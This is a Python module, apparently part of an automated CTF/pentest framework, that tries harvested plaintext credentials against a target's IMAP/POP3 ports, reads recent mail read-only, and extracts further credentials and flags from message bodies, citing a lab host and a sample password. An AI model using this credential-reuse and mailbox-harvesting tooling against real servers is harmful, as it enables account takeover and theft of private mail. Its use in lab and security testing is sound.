"""메일(IMAP/POP3) 발판 — 수확한 평문 자격으로 로그인해 메일 본문을 읽고, 그 안의
'다음 단계' 자격·단서·플래그를 수확한다.

배경(실측 Enigma): 온보딩 PDF 에서 얻은 자격(kevin:Enigma2024!)이 SSH 가 아니라 **webmail**
계정(mail001.enigma.htb, 110/143/993/995)이라, 자격을 SSH 에만 분사하던 에이전트는 발판이
안 섰다. 메일에 로그인해 본문을 읽으면 보통 '다음 자격/내부 호스트/초기 비밀번호'가 나온다.

안전 경계(불변):
  · **옵트인 전용**(--full-auto 등 exploit_exec/auto_poc 하에서만 오케스트레이터가 호출).
  · **타겟 IP 한정** — 바인딩된 타겟의 메일 포트에만 로그인(스코프 확장 없음).
  · **읽기 전용** — 로그인→헤더/본문 fetch→로그아웃. 메일 전송·삭제·플래그변경 없음.
  · 표준 라이브러리만(imaplib/poplib/email). 네트워크 fetch 는 주입 가능(테스트).
"""
from __future__ import annotations

import email
import email.header
import imaplib
import poplib
from dataclasses import dataclass, field

_MAX_MSGS = 15          # 계정당 읽을 최근 메일 수 상한
_MAX_BODY = 64 * 1024   # 메일 1통 본문 상한(파싱 비용 방어)
_TIMEOUT = 15.0         # 로그인·fetch 타임아웃(초)


@dataclass
class MailFinding:
    """한 메일 계정 로그인 결과(발판 재료). 전부 '읽기'로만 얻는다."""
    endpoint: str = ""                                            # "imaps://host:993 as kevin"
    user: str = ""
    creds: list[tuple[str, str]] = field(default_factory=list)   # 본문에서 캔 (user, pass)
    flags: list[tuple[str, str]] = field(default_factory=list)   # (kind, value)
    notable: list[str] = field(default_factory=list)             # 제목/주목 줄(안내용)
    msg_count: int = 0


# ── 메일 메시지 → 텍스트 ───────────────────────────────────────────────
def _decode_header(val: str) -> str:
    try:
        return str(email.header.make_header(email.header.decode_header(val or "")))
    except Exception:   # noqa: BLE001 — 헤더 디코드 실패는 원문 반환
        return val or ""


def msg_to_text(raw: bytes) -> str:
    """RFC822 원문(bytes) → '제목 + text/plain·text/html 본문' 텍스트. 멀티파트 walk."""
    try:
        msg = email.message_from_bytes(raw)
    except Exception:   # noqa: BLE001
        return raw.decode("utf-8", "replace")[:_MAX_BODY]
    parts: list[str] = []
    subj = _decode_header(msg.get("Subject", ""))
    frm = _decode_header(msg.get("From", ""))
    if subj:
        parts.append(f"Subject: {subj}")
    if frm:
        parts.append(f"From: {frm}")
    bodies = msg.walk() if msg.is_multipart() else [msg]
    for p in bodies:
        if p.get_content_type() not in ("text/plain", "text/html"):
            continue
        try:
            payload = p.get_payload(decode=True)
        except Exception:   # noqa: BLE001
            continue
        if not isinstance(payload, (bytes, bytearray)):
            continue
        charset = p.get_content_charset() or "utf-8"
        parts.append(bytes(payload).decode(charset, "replace"))
    return "\n".join(parts)[:_MAX_BODY]


# ── 실제 네트워크 fetch(주입 가능) ─────────────────────────────────────
def imap_fetch(host: str, port: int, user: str, password: str, use_ssl: bool = True,
               max_msgs: int = _MAX_MSGS, timeout: float = _TIMEOUT) -> tuple[bool, list[str]]:
    """IMAP(S) 로그인 → INBOX 최근 메일 본문 리스트. 전송 없음(읽기만). (ok, bodies)."""
    M = None
    try:
        M = (imaplib.IMAP4_SSL(host, port, timeout=timeout) if use_ssl
             else imaplib.IMAP4(host, port, timeout=timeout))
        M.login(user, password)
        M.select("INBOX", readonly=True)
        _typ, data = M.search(None, "ALL")
        ids = (data[0].split() if data and data[0] else [])[-max_msgs:]
        bodies: list[str] = []
        for i in reversed(ids):
            _t, md = M.fetch(i, "(RFC822)")
            if md and md[0] and isinstance(md[0], tuple):
                bodies.append(msg_to_text(md[0][1]))
        return True, bodies
    except (imaplib.IMAP4.error, OSError):
        return False, []
    finally:
        if M is not None:
            try:
                M.logout()
            except Exception:   # noqa: BLE001
                pass


def pop3_fetch(host: str, port: int, user: str, password: str, use_ssl: bool = True,
               max_msgs: int = _MAX_MSGS, timeout: float = _TIMEOUT) -> tuple[bool, list[str]]:
    """POP3(S) 로그인 → 최근 메일 본문 리스트. 삭제 없음(읽기만). (ok, bodies)."""
    P = None
    try:
        P = (poplib.POP3_SSL(host, port, timeout=timeout) if use_ssl
             else poplib.POP3(host, port, timeout=timeout))
        P.user(user)
        P.pass_(password)
        count = len(P.list()[1])
        bodies: list[str] = []
        start = max(1, count - max_msgs + 1)
        for i in range(count, start - 1, -1):
            _resp, lines, _oct = P.retr(i)
            bodies.append(msg_to_text(b"\r\n".join(lines)))
        return True, bodies
    except (poplib.error_proto, OSError):
        return False, []
    finally:
        if P is not None:
            try:
                P.quit()
            except Exception:   # noqa: BLE001
                pass


# ── 수확 ──────────────────────────────────────────────────────────────
def _resolve(cred_parser, flag_scanner):
    if cred_parser is None:
        from .cred_sources import parse_config_creds as cred_parser
    if flag_scanner is None:
        from .flag import scan as flag_scanner
    return cred_parser, flag_scanner


def _harvest_body(fnd: MailFinding, text: str, seen_cred: set, seen_flag: set,
                  cred_parser, flag_scanner, flag_kind: str) -> None:
    """메일 1통 본문에서 자격·플래그를 수확한다(본문 자신의 로그인 자격은 제외하지 않음 —
    본문에 '다음 계정'이 평문으로 있는 경우를 잡는다). 파서 예외는 무시하고 계속."""
    first = text.splitlines()[0].strip() if text.strip() else ""
    if first and first not in fnd.notable:
        fnd.notable.append(first[:120])
    try:
        for u, p, _label in cred_parser(text):
            if (u, p) not in seen_cred:
                seen_cred.add((u, p))
                fnd.creds.append((u, p))
    except Exception:   # noqa: BLE001
        pass
    try:
        for hit in flag_scanner(f"[mail] {fnd.endpoint}", text, flag_kind):
            if hit.value not in seen_flag:
                seen_flag.add(hit.value)
                fnd.flags.append((hit.kind, hit.value))
    except Exception:   # noqa: BLE001
        pass


def _endpoints(open_ports):
    """열린 포트에 맞춰 시도할 (proto, port, ssl, kind) 목록. SSL 우선."""
    def avail(p):
        return (not open_ports) or (p in set(open_ports))
    eps = []
    if avail(993):
        eps.append(("imaps", 993, True, "imap"))
    if avail(995):
        eps.append(("pop3s", 995, True, "pop3"))
    if avail(143):
        eps.append(("imap", 143, False, "imap"))
    if avail(110):
        eps.append(("pop3", 110, False, "pop3"))
    return eps


def has_mail_port(open_ports) -> bool:
    return bool(open_ports) and bool({110, 143, 993, 995} & set(open_ports))


def try_mail_logins(host: str, creds: list[tuple[str, str]], open_ports=None,
                    domain: str = "", fetch_imap=imap_fetch, fetch_pop3=pop3_fetch,
                    cred_parser=None, flag_scanner=None, flag_kind: str = "boot2root",
                    max_creds: int = 5) -> list[MailFinding]:
    """수확한 평문 자격을 메일 포트에 로그인 시도하고, 성공하면 본문에서 다음 자격·플래그를
    수확한다. 사용자명은 그대로 + (도메인 알면) user@domain 둘 다 시도. 읽기 전용·주입 가능."""
    cred_parser, flag_scanner = _resolve(cred_parser, flag_scanner)
    eps = _endpoints(open_ports)
    out: list[MailFinding] = []
    seen_cred: set[tuple[str, str]] = set()
    seen_flag: set[str] = set()
    tried: set[tuple[str, int]] = set()
    for user, pw in creds[:max_creds]:
        userforms = [user]
        if domain and "@" not in user:
            userforms.append(f"{user}@{domain}")
        logged_in = False
        for uf in userforms:
            for proto, port, ssl, kind in eps:
                if (uf, port) in tried:
                    continue
                tried.add((uf, port))
                fetch = fetch_imap if kind == "imap" else fetch_pop3
                try:
                    ok, bodies = fetch(host, port, uf, pw, ssl)
                except Exception:   # noqa: BLE001 — fetch 내부 예외 흡수
                    ok, bodies = False, []
                if not ok:
                    continue
                fnd = MailFinding(endpoint=f"{proto}://{host}:{port} as {uf}",
                                  user=uf, msg_count=len(bodies))
                for b in bodies:
                    _harvest_body(fnd, b, seen_cred, seen_flag,
                                  cred_parser, flag_scanner, flag_kind)
                out.append(fnd)
                logged_in = True
                break
            if logged_in:
                break
    return out
